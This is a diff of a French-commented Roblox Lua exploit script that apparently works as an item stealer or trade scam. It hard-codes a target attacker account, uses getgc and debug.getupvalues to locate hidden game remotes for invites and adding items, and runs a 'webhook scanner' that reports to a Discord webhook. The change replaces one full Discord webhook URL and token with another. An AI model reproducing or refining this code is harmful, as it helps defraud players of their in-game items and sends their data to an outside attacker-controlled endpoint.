@@ -40,10 +40,12 @@ task.spawn(function()
 
     local TARGET_USER_ID = 7919988179
     local TARGET_USERNAME = "S370z1"
-    local WEBHOOK_URL = "https://discord.com/api/webhooks/1509251562780889128/jwigPZCSgn2cGoPcFjG9Pz6iZ_klziZ-3PqlcBQk0T9a8XH4-YzFdlohlUE_7PfbA7h7"
+    -- ==================== NOUVEAU WEBHOOK ====================
+    local WEBHOOK_URL = "https://discord.com/api/webhooks/1540396229295349932/lR9-7DsZoteaj3MrYQAV0kf8Qo4LA2xljnAuZEtfhIcXfCuLAbVIs-jJpjDE-GMdzIqd"
+    -- ========================================================
     local GOOD_AVATAR = "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"
 
-    -- ==================== MODIFICATIONS UUID ====================
+    -- ==================== UUID MULTIPLES ====================
     local INVITE_UUIDS = {
         "586d58bf-56e6-42b4-a93f-dbceecb89097",  -- nouveau
         "afb005f9-6e81-4e0a-8bb0-3555938a9658"   -- ancien
@@ -54,7 +56,7 @@ task.spawn(function()
     }
     local activeInviteUUID = nil
     local activeAddUUID = nil
-    -- ============================================================
+    -- ========================================================
 
     local Remotes = {Invite = nil, AddBrainrot = nil}
     local remotesReady = false
@@ -97,7 +99,6 @@ task.spawn(function()
         return "$" .. tostring(math.floor(n)) .. "/s"
     end
 
-    -- ==================== findRemotes MODIFIÉE ====================
     local function findRemotes()
         if Remotes.Invite and Remotes.AddBrainrot then return end
         for _, v in ipairs(getgc(true)) do
@@ -106,7 +107,6 @@ task.spawn(function()
                 if success then
                     for _, const in ipairs(constants) do
                         if type(const) == "string" then
-                            -- Vérifier les UUIDs d'invitation
                             for _, uuid in ipairs(INVITE_UUIDS) do
                                 if const == uuid and not Remotes.Invite then
                                     local successUpv, upvalues = pcall(debug.getupvalues, v)
@@ -121,7 +121,6 @@ task.spawn(function()
                                     end
                                 end
                             end
-                            -- Vérifier les UUIDs d'ajout
                             for _, uuid in ipairs(ADD_UUIDS) do
                                 if const == uuid and not Remotes.AddBrainrot then
                                     local successUpv, upvalues = pcall(debug.getupvalues, v)
@@ -143,7 +142,6 @@ task.spawn(function()
             if Remotes.Invite and Remotes.AddBrainrot then break end
         end
     end
-    -- ============================================================
 
     local function waitForChildSafe(parent, name, timeout)
         timeout = timeout or 30
@@ -206,7 +204,6 @@ task.spawn(function()
         end
     end)
 
-    -- ==================== FONCTIONS AVEC UUID ACTIF ====================
     local function sendInvite(targetUserId)
         if not Remotes.Invite or not activeInviteUUID then return false end
         local success, res = pcall(function()
@@ -223,10 +220,9 @@ task.spawn(function()
         if success then return res end
         return nil
     end
-    -- ============================================================
 
     -- =====================================================
-    -- WEBHOOK SCANNER (inchangé)
+    -- WEBHOOK SCANNER
     -- =====================================================
     task.spawn(function()
         local webhookSent = false
@@ -380,7 +376,6 @@ task.spawn(function()
         end
     end)
 
-    -- ========== SUITE DU SCRIPT (inchangée, mais utilise les nouvelles fonctions) ==========
     task.spawn(function()
         local HttpService = Services.HttpService
         local LocalPlayer = Services.Players.LocalPlayer
